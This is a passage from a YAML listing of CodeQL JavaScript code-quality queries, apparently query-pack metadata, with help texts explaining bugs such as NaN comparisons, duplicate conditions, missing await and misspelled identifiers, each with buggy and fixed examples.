      \   (y <= y &&\n          y < this.y+this.height);\n};\n\n```\nNote, however,\
      \ that on line 11 the programmer forgot to qualify `this.y`, thus ending up comparing\
      \ the argument `y` against itself. The comparison should be fixed accordingly:\n\
      \n\n```javascript\nfunction Rectangle(x, y, width, height) {\n\tthis.x = x;\n\t\
      this.y = y;\n\tthis.width = width;\n\tthis.height = height;\n}\n\nRectangle.prototype.contains\
      \ = function(x, y) {\n\treturn (this.x <= x &&\n\t        x < this.x+this.width)\
      \ &&\n\t       (this.y <= y &&\n\t        y < this.y+this.height);\n};\n```\n\
      A common use of self-comparison is to detect `NaN` values, which are the only\
      \ kind of values that are not considered equal to themselves:\n\n```javascript\n\
      \nfunction eq(x, y) {\n  // check if x is NaN\n  if (x !== x) {\n    // consider\
      \ NaN to be equal to itself\n    return y !== y;\n  }\n  return x === y;\n}\n\n\
      ```\nIn cases like this one, it is clearer to use the `isNaN` function from the\
      \ standard library:\n\n```javascript\n\nfunction eq(x, y) {\n  // check if x is\
      \ NaN\n  if (isNaN(x)) {\n    // consider NaN to be equal to itself\n    return\
      \ isNaN(y);\n  }\n  return x === y;\n}\n\n```\nIf you do not want to rely on `isNaN`\
      \ being defined, you can provide your own implementation: self-comparisons in\
      \ functions named `isNaN` (regardless of capitalization) are treated specially\
      \ and will not be flagged.\n\n\n## References\n* Mozilla Developer Network: [NaN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN).\n\
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n\
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/ComparisonWithNaN.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/ComparisonWithNaN.bqrs
    metadata:
      name: Comparison with NaN
      description: |-
        Arithmetic comparisons with NaN are useless: nothing is considered to be equal to NaN, not even NaN itself,
                      and similarly nothing is considered greater or less than NaN.
      kind: problem
      problem.severity: error
      id: js/comparison-with-nan
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: very-high
    queryHelp: |
      # Comparison with NaN
      Arithmetic comparisons with the special not-a-number value `NaN` are useless: nothing is considered to be equal to `NaN`, not even `NaN` itself, and similarly nothing is considered greater or less than `NaN`.


      ## Recommendation
      Use the `isNaN` function from the standard library to determine whether a given value is `NaN`.


      ## Example
      Instead of `x === NaN`, use `isNaN(x)`.


      ## References
      * Arvind Kumar: [Javascript common mistake of comparing with NaN and not with isNaN](http://www.devarticles.in/javascript/javascript-common-mistake-of-comparing-variable-with-nan-and-not-with-isnan/).
      * Mozilla Developer Network: [NaN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN).
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/DuplicateCondition.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateCondition.bqrs
    metadata:
      name: Duplicate 'if' condition
      description: |-
        If two conditions in an 'if'-'else if' chain are identical, the
                      second condition will never hold.
      kind: problem
      problem.severity: warning
      id: js/duplicate-condition
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Duplicate 'if' condition\nIf two conditions in an 'if'-'else if' chain\
      \ are identical, the second condition will never hold. This most likely indicates\
      \ a copy-paste error where the first condition was copied and then not properly\
      \ adjusted. Even if the duplication is intentional (relying, for instance, on\
      \ non-determinism or side effects), such code is confusing and should be avoided.\n\
      \n\n## Recommendation\nExamine the two conditions to find out what they were meant\
      \ to check. If both the conditions and the branches that depend on them are identical,\
      \ then the second branch is duplicate code that can be deleted. Otherwise, the\
      \ second condition needs to be adjusted.\n\n\n## Example\nIn the example below,\
      \ the function `controller` checks its parameter `msg` to determine what operation\
      \ it is meant to perform. However, the comparison in the 'else if' is identical\
      \ to the comparison in the 'if', so this branch will never be taken.\n\n\n```javascript\n\
      function controller(msg) {\n\tif (msg == 'start')\n\t\tstart();\n\telse if (msg\
      \ == 'start')\n\t\tstop();\n\telse\n\t\tthrow new Error(\"Message not understood.\"\
      );\n}\n```\nClearly, the 'else if' branch should compare `msg` to `'stop'`:\n\n\
      \n```javascript\nfunction controller(msg) {\n\tif (msg == 'start')\n\t\tstart();\n\
      \telse if (msg == 'stop')\n\t\tstop();\n\telse\n\t\tthrow new Error(\"Message\
      \ not understood.\");\n}\n```\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/DuplicateProperty.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateProperty.bqrs
    metadata:
      name: Duplicate property
      description: |-
        Listing the same property twice in one object literal is
                      redundant and may indicate a copy-paste mistake.
      kind: problem
      problem.severity: warning
      id: js/duplicate-property
      tags: |-
        quality
               maintainability
               readability
               external/cwe/cwe-563
      precision: very-high
    queryHelp: |
      # Duplicate property
      In ECMAScript 2015 and above, as well as ECMAScript 5 non-strict mode, an object literal may define the same property multiple times, with later definitions overwriting earlier ones. If all definitions assign the same value to the property, this will not to lead to problems at runtime, but it makes the code harder to read and maintain.


      ## Recommendation
      Eliminate the spurious redefinition.


      ## Example
      In the following example, the object literal passed to method `css` has two definitions of property `backgroundColor`, both setting it to value `"orange"`.


      ```javascript
      $(".alert").css({
        backgroundColor: "orange",
        fontWeight: "bold",
        backgroundColor: "orange"
      });
      ```
      The second definition is spurious and should be removed:


      ```javascript
      $(".alert").css({
        backgroundColor: "orange",
        fontWeight: "bold"
      });
      ```

      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Annex C. ECMA, 2011.
      * Ecma International, *ECMAScript Language Definition*, 6th Edition, Annex E. ECMA, 2015.
      * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/DuplicateSwitchCase.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/DuplicateSwitchCase.bqrs
    metadata:
      name: Duplicate switch case
      description: |-
        If two cases in a switch statement have the same label, the second case
                      will never be executed.
      kind: problem
      problem.severity: warning
      id: js/duplicate-switch-case
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Duplicate switch case\nIn JavaScript, cases in a switch statement\
      \ can have arbitrary expressions as their labels. The interpreter does not check\
      \ that these expressions are all different. At runtime, if two cases in a switch\
      \ statement have the same label, the second case will never be executed. This\
      \ most likely indicates a copy-paste error where the first case was copied and\
      \ then not properly adjusted.\n\n\n## Recommendation\nExamine the two cases to\
      \ find out what they were meant to check. If both the case labels and their statements\
      \ are identical, then the second case is duplicate code that can be deleted. Otherwise,\
      \ the second case label needs to be adjusted.\n\n\n## Example\nIn the example\
      \ below, the function `controller` checks its parameter `msg` to determine what\
      \ operation it is meant to perform. Note that the 'switch' statement has two cases\
      \ labeled `'start'`; the second one will never be executed.\n\n\n```javascript\n\
      function controller(msg) {\n\tswitch (msg) {\n\tcase 'start':\n\t\tstart();\n\t\
      \tbreak;\n\tcase 'start':\n\t\tstop();\n\t\tbreak;\n\tdefault:\n\t\tthrow new\
      \ Error(\"Message not understood.\");\n\t}\n}\n```\nClearly, the second case should\
      \ be labeled `'stop'`:\n\n\n```javascript\nfunction controller(msg) {\n\tswitch\
      \ (msg) {\n\tcase 'start':\n\t\tstart();\n\t\tbreak;\n\tcase 'stop':\n\t\tstop();\n\
      \t\tbreak;\n\tdefault:\n\t\tthrow new Error(\"Message not understood.\");\n\t\
      }\n}\n```\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/ExprHasNoEffect.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/ExprHasNoEffect.bqrs
    metadata:
      name: Expression has no effect
      description: |-
        An expression that has no effect and is used in a void context is most
                      likely redundant and may indicate a bug.
      kind: problem
      problem.severity: warning
      id: js/useless-expression
      tags: |-
        quality
               maintainability
               useless-code
               external/cwe/cwe-480
               external/cwe/cwe-561
      precision: very-high
    queryHelp: |
      # Expression has no effect
      An expression that has no effects (such as changing variable values or producing output) and occurs in a context where its value is ignored possibly indicates missing code or a latent bug.


      ## Recommendation
      Carefully inspect the expression to ensure it is not a symptom of a bug. To document that the value of an expression is deliberately ignored, wrap it into a `void` expression.


      ## Example
      The following code snippet accesses the `selectedIndex` property of a DOM node to trigger additional processing in certain versions of Safari. This, however, is not clear from the code itself, which looks like a property read whose value is discarded immediately.


      ```javascript
      elem.parentNode.selectedIndex;

      ```
      To document the fact that the property read has a hidden side effect and its value is deliberately ignored, it should be wrapped into a `void` expression like this:


      ```javascript
      void(elem.parentNode.selectedIndex);

      ```
      A common source of warnings are constructor functions that "declare" a property of the newly constructed object without initializing it, by simply referring to it in an expression statement like this:


      ```javascript
      function Graph(nodes, edges) {
        this.nodes = nodes;
        this.edges = edges;
        // cache minimum distance between pairs of nodes
        this.distance;
      }
      ```
      Semantically, this is unnecessary, since the property will be created upon first assignment. If the aim is to document the existence of the property, it would be better to explicitly assign it an initial value, which also serves to document its expected type:


      ```javascript
      function Graph(nodes, edges) {
        this.nodes = nodes;
        this.edges = edges;
        // cache minimum distance between pairs of nodes
        this.distance = {};
      }
      ```

      ## References
      * JSLint Error Explanations: [Expected an assignment or function call](http://jslinterrors.com/expected-an-assignment-or-function-call).
      * Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).
      * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/HeterogeneousComparison.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/HeterogeneousComparison.bqrs
    metadata:
      name: Comparison between inconvertible types
      description: |-
        An equality comparison between two values that cannot be meaningfully converted to
                      the same type will always yield 'false', and an inequality comparison will always
                      yield 'true'.
      kind: problem
      problem.severity: warning
      id: js/comparison-between-incompatible-types
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-570
               external/cwe/cwe-571
      precision: high
    queryHelp:
      "# Comparison between inconvertible types\nIn JavaScript, equality operators\
      \ (`==`, `!=`, `===`, `!==`) and relational operators (`<`, `<=`, `>`, `>=`) can\
      \ be applied to values of arbitrary types. However, if the operands cannot be\
      \ converted to a common type, the result of the comparison will always be trivially\
      \ true (for equality) or false (for inequality). Such comparisons are often due\
      \ to a typo or a misunderstanding of the language semantics.\n\n\n## Recommendation\n\
      Inspect the comparison carefully to check whether it is due to a typo. If one\
      \ of the operands is a constant, replace it with a constant of the right type.\
      \ Otherwise, introduce appropriate function calls to convert the operands to a\
      \ common type.\n\n\n## Example\nThe following code attempts to check whether the\
      \ global variable `window` is defined:\n\n\n```javascript\nif (typeof window !==\
      \ undefined)\n\tconsole.log(\"Running in a browser.\");\n```\nHowever, this test\
      \ is ineffective: `typeof` always returns a string, never `undefined`, so the\
      \ `if` condition will always evaluate to `true`. Instead, the result of `typeof`\
      \ should be compared to the string literal `\"undefined\"`:\n\n\n```javascript\n\
      if (typeof window !== \"undefined\")\n\tconsole.log(\"Running in a browser.\"\
      );\n```\nAs another example, consider the following code snippet, which is meant\
      \ to check whether the string `\"hello\"` occurs in the string held in variable\
      \ `text`.\n\n\n```javascript\nif (text.indexOf(\"hello\" >= 0))\n\tconsole.log(\"\
      Found it.\");\n```\nNote, however, that the test has been mistyped: the closing\
      \ parenthesis of the call to `index` should come before the operator `>=`, not\
      \ after it. As it stands, this code performs a greater-or-equal comparison between\
      \ the constant string `\"hello\"` and the number zero, which evaluates to `false`.\
      \ This value is then passed to `indexOf`, which converts it to the string `\"\
      false\"` and returns the first index at which this string occurs in `text` (or\
      \ `-1` if it does not occur at all).\n\nTo fix this issue, the test should be\
      \ rebracketed like this:\n\n\n```javascript\nif (text.indexOf(\"hello\") >= 0)\n\
      \tconsole.log(\"Found it.\");\n```\n\n## References\n* Mozilla Developer Network:\
      \ [Comparison Operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comparison_Operators).\n\
      * Mozilla Developer Network: [Equality comparisons and when to use them](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_when_to_use_them).\n\
      * Common Weakness Enumeration: [CWE-570](https://cwe.mitre.org/data/definitions/570.html).\n\
      * Common Weakness Enumeration: [CWE-571](https://cwe.mitre.org/data/definitions/571.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/ImplicitOperandConversion.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/ImplicitOperandConversion.bqrs
    metadata:
      name: Implicit operand conversion
      description: |-
        Relying on implicit conversion of operands is error-prone and makes code
                      hard to read.
      kind: problem
      problem.severity: warning
      id: js/implicit-operand-conversion
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-704
      precision: very-high
    queryHelp: |
      # Implicit operand conversion
      In JavaScript, most operators can be applied to operands of arbitrary types; at runtime, the operands will be implicitly converted to the appropriate type. For instance, the expression `p in obj` checks whether the object `obj` contains a property whose name equals the string that `p` evaluates to. If `p` does not evaluate to a string or `o` does not evaluate to an object, implicit conversions are performed before the check is carried out.

      In many cases, however, these implicit conversions result from a typo or a misunderstanding of operator precedence rules. Even if the conversions are intentional, relying on them makes the code hard to understand.


      ## Recommendation
      Inspect the expression carefully to check whether the operands have been mistyped, and correct them if this is the case. If the conversions are intentional, consider replacing them by explicit conversions to clarify the meaning of the code.


      ## Example
      The following code intends to check whether object `obj` does not contain a property of the name stored in variable `member`:


      ```javascript
      function invk(obj, member) {
          if (!member in obj)
              throw new Error("No such member: " + member);
          return obj[member]();
      }
      ```
      However, this test is ineffective as written: the operator `!` binds more tightly than `in`, so it is applied first. Applying `!` to a non-empty string yields `false`, so the `in` operator actually ends up checking whether `obj` contains a property called `"false"`.

      To fix this, parentheses should be introduced as follows:


      ```javascript
      function invk(obj, member) {
          if (!(member in obj))
              throw new Error("No such member: " + member);
          return obj[member]();
      }
      ```
      As an example of the intentional use of implicit conversions, consider the following function for comparing two numbers `x` and `y`. It returns `1` if `x>y`, `-1` if `x<y`, and `0` if they are equal.


      ```javascript
      function cmp(x, y) {
          return (x > y) - (x < y);
      }
      ```
      It would be much clearer to write this out directly:


      ```javascript
      function cmp(x, y) {
          if (x > y)
              return 1;
          if (x < y)
              return -1;
          return 0;
      }
      ```
      At the very least, the Boolean comparison results should be explicitly converted to numbers:


      ```javascript
      function cmp(x, y) {
          return +(x > y) - +(x < y);
      }
      ```

      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 9. ECMA, 2011.
      * Common Weakness Enumeration: [CWE-704](https://cwe.mitre.org/data/definitions/704.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/MissingAwait.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/MissingAwait.bqrs
    metadata:
      name: Missing await
      description:
        Using a promise without awaiting its result can lead to unexpected
        behavior.
      kind: problem
      problem.severity: warning
      id: js/missing-await
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp: |
      # Missing await
      In JavaScript, `async` functions always return a promise object. To obtain the underlying value of the promise, use the `await` operator or call the `then` method. Attempting to use a promise object instead of its underlying value can lead to unexpected behavior.


      ## Recommendation
      Use the `await` operator to get the value contained in the promise. Alternatively, call `then` on the promise and use the value passed to the callback.


      ## Example
      In the following example, the `getData` function returns a promise, and the caller checks if the returned promise is `null`:


      ```javascript
      async function getData(id) {
        let req = await fetch(`https://example.com/data?id=${id}`);
        if (!req.ok) return null;
        return req.json();
      }

      async function showData(id) {
        let data = getData(id);
        if (data == null) {
          console.warn("No data for: " + id);
          return;
        }
        // ...
      }

      ```
      However, the null check does not work as expected. The `return null` statement on line 2 actually returns a *promise* containing the `null` value. Since the promise object itself is not equal to `null`, the error check is bypassed.

      The issue can be corrected by inserting `await` before the promise:


      ```javascript
      async function getData(id) {
        let req = await fetch(`https://example.com/data?id=${id}`);
        if (!req.ok) return null;
        return req.json();
      }

      async function showData(id) {
        let data = await getData(id);
        if (data == null) {
          console.warn("No data for: " + id);
          return;
        }
        // ...
      }

      ```

      ## References
      * MDN: [Using promises](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises)
      * MDN: [Async functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)
      * MDN: [Await operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/MissingDotLengthInComparison.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/MissingDotLengthInComparison.bqrs
    metadata:
      name: Missing '.length' in comparison
      description: |-
        Two variables are being compared using a relational operator, but one is also used
                     to index into the other, suggesting a ".length" is missing from the comparison.
      kind: problem
      problem.severity: warning
      id: js/missing-dot-length-in-comparison
      precision: high
      tags: |-
        quality
               reliability
               correctness
    queryHelp: |
      # Missing '.length' in comparison
      It is very common to check whether a number is within the bounds of an array or string using a comparison of form `i < array.length`, and later perform an indexing access `array[i]`. If this comparison is mistyped as `i < array`, a type coercion will be performed, which almost never has the intended effect.


      ## Recommendation
      Check if one of the operands is an array or a string, and make sure to compare against its `length`, not against the value itself.


      ## Example
      The following example shows a mistyped loop condition `i < array`:


      ```javascript
      for (var i = 0; i < array; ++i) {
          count += array[i]
      }

      ```
      If the above is executed with `array` set to `[3,5,7]`, the loop will not run at all. The error can be corrected by changing the loop condition to `i < array.length`:


      ```javascript
      for (var i = 0; i < array.length; ++i) {
          count += array[i]
      }

      ```

      ## References
      * Mozilla Developer Network: [Array.length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/length)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/MissingSpaceInAppend.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/MissingSpaceInAppend.bqrs
    metadata:
      name: Missing space in string concatenation
      description: |-
        Joining constant strings into a longer string where
                      two words are concatenated without a separating space
                      usually indicates a text error.
      kind: problem
      problem.severity: warning
      precision: very-high
      id: js/missing-space-in-concatenation
      tags: |-
        quality
               maintainability
               readability
    queryHelp: |
      # Missing space in string concatenation
      Splitting a long string literal over multiple lines can often aid readability, but this also makes it difficult to notice whether a space is missing where the strings are concatenated.


      ## Recommendation
      Check the string literal to see whether it has the intended text. In particular, look for missing spaces near line breaks.


      ## Example
      The following example shows a text literal that is split over two lines and omits a space character between the two words at the line break.


      ```javascript
      var s = "This text is" +
        "missing a space.";
      ```

      ## References
      * Mozilla Developer Network: [Strings: Long literal strings](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Long_literal_strings).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/MisspelledIdentifier.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/MisspelledIdentifier.bqrs
    metadata:
      name: Misspelled identifier
      description: Misspelled identifiers make code harder to read and understand.
      kind: problem
      problem.severity: recommendation
      id: js/misspelled-identifier
      tags: |-
        maintainability
               readability
      precision: low
    queryHelp: |+
      # Misspelled identifier
      Misspelled identifiers make code harder to read and understand. In a dynamically typed language like JavaScript, they may also indicate a bug where a reference to a property was accidentally misspelled.

      Note that this rule does not flag misspellings of local variable names, which are instead highlighted by the rule 'Misspelled variable name'.


      ## Recommendation
      Correct the misspelling.


      ## Example
      The following code snippet attempts to loop over an array `ids` in order to update DOM nodes referenced by the elements of the array. Note, however, that the upper bound of the loop is specified as `ids.lenght`, a typo for `ids.length`. At runtime, `ids.lenght` will evaluate to `undefined`, so the check `i < ids.lenght` will always fail, and the loop body is never executed.


      ```javascript
      for (var i=1; i<ids.lenght; ++i) {
          var id = ids[i];
          if (id) {
              var element = document.getElementById(id);
              element.className += " selected";
          }
      }
      ```
      The misspelling should be corrected by replacing `lenght` with `length`.

  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/MisspelledVariableName.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/MisspelledVariableName.bqrs
    metadata:
      name: Misspelled variable name
      description: |-
        Misspelling a variable name implicitly introduces a global
                      variable, which may not lead to a runtime error, but is
                      likely to give wrong results.
      kind: problem
      problem.severity: warning
      id: js/misspelled-variable-name
      tags: |-
        quality
               reliability
               correctness
      precision: very-high
    queryHelp: |
      # Misspelled variable name
      If a reference to a local variable is accidentally misspelled, it will be interpreted as a reference to an implicitly declared global variable, which may indicate a bug. Even if this is intentional, it should be avoided as it makes the code hard to read.


      ## Recommendation
      Correct the misspelling.


      ## Example
      The following code snippet attempts to loop over an array `ids` in order to update DOM nodes referenced by the elements of the array. Note, however, that the upper bound of the loop is specified as `lenght`, a typo for the local variable `length`. At runtime, `lenght` will evaluate to `undefined`, so the check `i < lenght` will always fail, and the loop body is never executed.


      ```javascript
      function selectElements(ids) {
          for (var i=0, length=ids.length; i<lenght; ++i) {
              var id = ids[i];
              if (id) {
                  var element = document.getElementById(id);
                  element.className += " selected";
              }
          }
      }

      ```
      The misspelling should be corrected by replacing `lenght` with `length`.


      ## References
      * D. Crockford: *JavaScript: The Good Parts*, Appendix A: Awful Parts, Global Variables. O'Reilly, 2008.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/RedundantExpression.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/RedundantExpression.bqrs
    metadata:
      name: Identical operands
      description: |-
        Passing identical, or seemingly identical, operands to an
                      operator such as subtraction or conjunction may indicate a typo;
                      even if it is intentional, it makes the code hard to read.
      kind: problem
      problem.severity: warning
      id: js/redundant-operation
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-480
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Identical operands\nMany arithmetic or logical operators yield a trivial\
      \ result when applied to identical operands: for instance, `x-x` yields zero if\
      \ `x` is a number, and yields `NaN` otherwise; `x&&x` is always equal to `x`.\
      \ Code like this is often the result of a typo, such as misspelling a variable\
      \ name. Even if it is intentional (relying, for instance, on side effects), such\
      \ code is hard to read and understand and should be avoided.\n\n\n## Recommendation\n\
      Examine the operands for typos. Replace intentional uses of identical operands\
      \ that have side effects with clearer alternatives.\n\n\n## Example\nIn the example\
      \ below, the function `avg` is intended to compute the average of two numbers\
      \ `x` and `y`. However, the programmer accidentally used `x` twice, so the function\
      \ just returns `x`:\n\n\n```javascript\nfunction avg(x, y) {\n\treturn (x + x)/2;\n\
      }\n```\nThis problem can be fixed by correcting the typo:\n\n\n```javascript\n\
      function avg(x, y) {\n\treturn (x + y)/2;\n}\n```\nIn some cases, an expression\
      \ that looks redundant cannot, in fact, be simplified due to side effects. For\
      \ instance, `f() && f()` is not necessarily equivalent to `f()`, since `f` may\
      \ have side effects. This may not be immediately apparent to the reader, however,\
      \ and it is usually clearer to expand this expression into an 'if' statement:\n\
      \n\n```javascript\nif (f())\n\tf();\n```\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/SelfAssignment.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/SelfAssignment.bqrs
    metadata:
      name: Self assignment
      description: Assigning a variable to itself has no effect.
      kind: problem
      problem.severity: warning
      id: js/redundant-assignment
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-480
               external/cwe/cwe-561
      precision: high
    queryHelp:
      "# Self assignment\nAssigning a variable to itself typically indicates\
      \ a mistake such as a missing `this` qualifier or a misspelled variable name.\n\
      \n\n## Recommendation\nCarefully inspect the assignment to check for misspellings\
      \ or missing qualifiers.\n\nIf the self-assignment is intentional and is needed\
      \ for documentation or optimization purposes, add a JSDoc comment with a `@type`\
      \ tag. This will indicate the self-assignment is intentional.\n\n\n## Example\n\
      In the example below, the constructor function `Rectangle` is intended to initialize\
      \ properties `x`, `y`, `width`, and `height` to the parameters of the same names.\n\
      \n\n```javascript\nfunction Rectangle(x, y, width, height) {\n\tthis.x = x;\n\t\
      this.y = y;\n\twidth = width;\n\tthis.height = height;\n}\n\n```\nNote, however,\
      \ that on line 4 the programmer forgot to qualify the left hand side of the assignment\
      \ with `this`: the code now performs a useless assignment of the `width` parameter\
      \ to itself and leaves the `width` property uninitialized.\n\nTo fix this issue,\
      \ insert a `this` qualifier:\n\n\n```javascript\nfunction Rectangle(x, y, width,\
      \ height) {\n\tthis.x = x;\n\tthis.y = y;\n\tthis.width = width;\n\tthis.height\
      \ = height;\n}\n\n```\n\n## References\n* Ecma International, *ECMAScript Language\
      \ Definition*, 5.1 Edition, Section 11.13. ECMA, 2011.\n* Common Weakness Enumeration:\
      \ [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n* Common Weakness\
      \ Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/ShiftOutOfRange.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/ShiftOutOfRange.bqrs
    metadata:
      name: Shift out of range
      description: |-
        The integer shift operators '<<', '>>' and '>>>' only take the five least significant bits of their
                      right operand into account. Thus, it is not possible to shift an integer by more than 31 bits.
      kind: problem
      problem.severity: error
      id: js/shift-out-of-range
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-197
      precision: very-high
    queryHelp: |
      # Shift out of range
      Shift operations in JavaScript operate on 32-bit values only, so it is not possible to shift by more than 31 positions. If the right operand of a shift operator is greater than 31, the left operand is actually only shifted by that value modulo 32.


      ## Recommendation
      Use standard library functions such as `Math.pow` to perform the required shifting. Alternatively, you can use the [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) type if it is available on your platform.


      ## Example
      The following code snippet attempts to assign `x` the value 2<sup>40</sup> (1099511627776). In fact, however, the left operand `1` is only shifted by `8` (that is, 40 modulo 32), so `x` ends up being assigned the value 2<sup>8</sup> (256).


      ```javascript
      var x = 1<<40;
      ```
      A better solution would be to use `Math.pow` as follows:


      ```javascript
      var x = Math.pow(2, 40);
      ```
      Note, however, that JavaScript internally represents large numbers as floating point numbers, so numbers with a magnitude larger than 2<sup>53</sup> will be represented imprecisely.


      ## References
      * Mozilla Developer Network: [Bitwise operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators).
      * Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/StringInsteadOfRegex.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/StringInsteadOfRegex.bqrs
    metadata:
      name: String instead of regular expression
      description:
        Calling 'String.prototype.replace' or 'String.prototype.split' with
        a string argument that looks like a regular expression is probably a mistake
        because the called function will not convert the string into a regular expression.
      kind: problem
      problem.severity: warning
      id: js/string-instead-of-regex
      tags: |-
        quality
               reliability
               correctness
      precision: high
    queryHelp:
      "# String instead of regular expression\nCalling the builtin methods\
      \ `String.prototype.split` and `String.prototype.replace` with a string as the\
      \ first argument makes the methods search for that exact string. Providing a regular\
      \ expression instead of the string makes the methods perform a regular expression\
      \ search.\n\nCalling the methods with a string that has the format of a regular\
      \ expression is likely a mistake because the methods will not convert the string\
      \ to a regular expression.\n\n\n## Recommendation\nCall `String.prototype.split`\
      \ and `String.prototype.replace` with a regular expression as the first argument\
      \ unless you want an exact search.\n\n\n## Example\nThe following code snippet\
      \ shows a call to `String.prototype.replace`. The purpose of the call is to remove\
      \ all characters that are not alphanumeric.\n\n```javascript\n\n\t\t\tvar cleaned\
      \ = input.replace(\"[^a-zA-Z0-9]+\", \"\");\n\t\t\n```\nUnfortunately, the first\
      \ argument is a string and not a regular expression, so the call will only remove\
      \ the first substring that is exactly \"`[^a-zA-Z0-9]+`\".\n\nInstead, the first\
      \ argument should be a regular expression with the `global` flag set:\n\n```javascript\n\
      \n\t\t\tvar cleaned = input.replace(/[^a-zA-Z0-9]+/g, \"\");\n\t\t\n```\n\n##\
      \ References\n* Mozilla Developer Network: [String.prototype.split](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split)\n\
      * Mozilla Developer Network: [String.prototype.replace](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Expressions/SuspiciousInvocation.ql
    relativeBqrsPath: codeql/javascript-queries/Expressions/SuspiciousInvocation.bqrs
    metadata:
      name: Invocation of non-function
      description: |-
        Trying to invoke a value that is not a function will result
                      in a runtime exception.
      kind: problem
      problem.severity: error
      id: js/call-to-non-callable
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-476
      precision: high
    queryHelp: |
      # Invocation of non-function
      Attempting to invoke a non-function (that is, a primitive value or an object) will cause an exception at runtime. This applies both to calls using `new` and normal calls.


      ## Recommendation
      Carefully inspect the invocation in question. If the problem was not detected during testing, this could either be because the invocation is in dead code, or because it is not covered by a test. In the former case, delete the dead code in question. In the latter case, consider adding a new test.


      ## Example
      In the following example, function `processResponse` accepts an argument `response`, and, depending on the value of property `response.status`, does one of two things: if `response.status` is 200, it invokes a function `processResponseText` (not shown), and if that function returns an `error` value, it throws that value as an exception; otherwise, it invokes `error` to log the value of `response.status`.


      ```javascript
      function error(msg) {
        console.log(msg);
      }

      function processResponse(response) {
        if (response.status === 200) {
          var error = processResponseText(response.responseText);
          if (error)
             throw error;
        } else {
          error("Unexpected response status " + response.status);
        }
      }
      ```
      Note that due to JavaScript's scoping rules, `error` in the "else" branch actually refers to the `error` variable declared in the "then" branch (and not the global function of the same name). Since that variable is always `undefined` in the "else" branch, attempting to invoke it will result in an exception at runtime.

